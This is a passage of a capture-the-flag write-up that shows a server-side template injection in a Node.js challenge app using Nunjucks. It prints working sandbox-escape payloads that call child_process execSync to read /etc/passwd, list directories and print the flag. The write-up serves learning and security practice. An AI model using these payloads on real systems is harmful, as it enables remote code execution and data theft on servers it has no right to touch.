+<p>Now we are in the admin dashboard, but we need full code execution in order to obtain the flag. From the dashboard, we have the ability to edit the
+"Naughty or Nice" list displayed on the landing page. The card on the landing page that displays the list has a helper, <code>CardHelpers.js</code> in the <code>/challenge/helpers/</code> directory.</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span> <span class="nx">nunjucks</span>   <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;nunjucks&#39;</span><span class="p">);</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="k">async</span> <span class="nx">generateCard</span><span class="p">(</span><span class="nx">elfList</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="ow">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="k">try</span> <span class="p">{</span>
+                <span class="kd">let</span> <span class="nx">NaughtyNames</span> <span class="o">=</span> <span class="nx">NiceNames</span> <span class="o">=</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+                <span class="k">for</span><span class="p">(</span><span class="nx">elfData</span> <span class="k">of</span> <span class="nx">elfList</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="s1">&#39;naughty&#39;</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">NaughtyNames</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">NaughtyNames</span><span class="si">}</span><span class="sb">\n</span><span class="si">${</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">elf_name</span><span class="si">}</span><span class="sb">&lt;br&gt;`</span><span class="p">;</span>
+                    <span class="p">}</span>
+                    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="s1">&#39;nice&#39;</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">NiceNames</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">NiceNames</span><span class="si">}</span><span class="sb">\n</span><span class="si">${</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">elf_name</span><span class="si">}</span><span class="sb">&lt;br&gt;`</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="nx">card</span> <span class="o">=</span> <span class="sb">`</span>
+<span class="sb">                    {% extends &quot;card.html&quot; %}</span>
+<span class="sb">                    {% block card %}</span>
+<span class="sb">                    &lt;div class=&quot;card&quot;&gt;</span>
+<span class="sb">                        &lt;div class=&quot;card-page cart-page-front&quot;&gt;</span>
+<span class="sb">                            &lt;div class=&quot;card-page cart-page-outside&quot;&gt;&lt;/div&gt;</span>
+<span class="sb">                            &lt;div class=&quot;card-page cart-page-inside&quot;&gt;</span>
+<span class="sb">                            &lt;p&gt;&lt;span class=&#39;nheader green&#39;&gt;Nice List&lt;/span&gt;</span>
+<span class="sb">                                </span><span class="si">${</span><span class="nx">NiceNames</span><span class="si">}</span><span class="sb"></span>
+<span class="sb">                            &lt;/p&gt;</span>
+<span class="sb">                            &lt;/div&gt;</span>
+<span class="sb">                        &lt;/div&gt;</span>
+<span class="sb">                        &lt;div class=&quot;card-page cart-page-bottom&quot;&gt;</span>
+<span class="sb">                            &lt;p&gt;&lt;span class=&#39;nheader red&#39;&gt;Naughty List&lt;/span&gt;</span>
+<span class="sb">                                </span><span class="si">${</span><span class="nx">NaughtyNames</span><span class="si">}</span><span class="sb"></span>
+<span class="sb">                            &lt;/p&gt;</span>
+<span class="sb">                        &lt;/div&gt;</span>
+<span class="sb">                    &lt;/div&gt;</span>
+<span class="sb">                    {% endblock %}</span>
+<span class="sb">                `</span><span class="p">;</span>
+                <span class="nx">resolve</span><span class="p">(</span><span class="nx">nunjucks</span><span class="p">.</span><span class="nx">renderString</span><span class="p">(</span><span class="nx">card</span><span class="p">));</span>
+            <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">})</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div>
+<h3 id="nunjucks-ssti-and-sandbox-escape">Nunjucks SSTI and Sandbox Escape:</h3>
+<p>Here, we see the code base is leveraging Nunjucks to help render the card. <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> is a templating engine specifically for
+JavaScript, which immediately makes me think this might be some sort of template injection vulnerability. We can do a quick test to confirm. </p>
+<p>First, we edit one of the items to contain <code>{{7*7}}</code>.</p>
+<p><img alt="7_7" src="../img/test_payload.png" /></p>
+<p>Navigating back to the homepage, we see that the our <code>{{7*7}}</code> payload renders as <code>49</code>, confirming that we have found a Server Side Template Injection!</p>
+<p><img alt="49" src="../img/49.png" /></p>
+<p>If we continue to poke around on Google, we find some research has already been done on SSTI within Nunjucks. Nunjucks template code runs in a sandbox, so in order to get RCE we 
+need to break out of that sandbox and access the underlying OS. If you are interested in how this sandbox escape works, checkout the pre-existing research that I used as a reference during this challenge - 
+<a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">SANDBOX BREAKOUT - A VIEW OF THE NUNJUCKS TEMPLATE ENGINE</a>. From that article, 
+we see the researchers obtained RCE with the following command:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kr">constructor</span><span class="p">(</span><span class="s2">&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tail /etc/passwd&#39;)&quot;</span><span class="p">)()}}</span>
+</code></pre></div>
+<p>Modifying this payload, we can obtain the flag!</p>
+<h3 id="final-payload">Final Payload:</h3>
+<p>First, we run </p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kr">constructor</span><span class="p">(</span><span class="s2">&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls /&#39;)&quot;</span><span class="p">)()}}</span>
+</code></pre></div>
+<p><img alt="ls" src="../img/ls.png" /></p>
+<p>We see the flag here, and we can change the payload to <code>cat</code> it out!</p>
+<p><img alt="see_flag" src="../img/see_flag.png" />
+<img alt="flag" src="../img/flag.png" />
+<img alt="flag" src="../img/flag_contents.png" /></p>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Welcome!" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Welcome!
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../tags.html" class="md-footer__link md-footer__link--next" aria-label="Next: Tags" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Tags
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright 2022 Stigward
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.ca141e46.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.6baa0517.min.js"></script>
+      
+    
+  </body>
+</html>
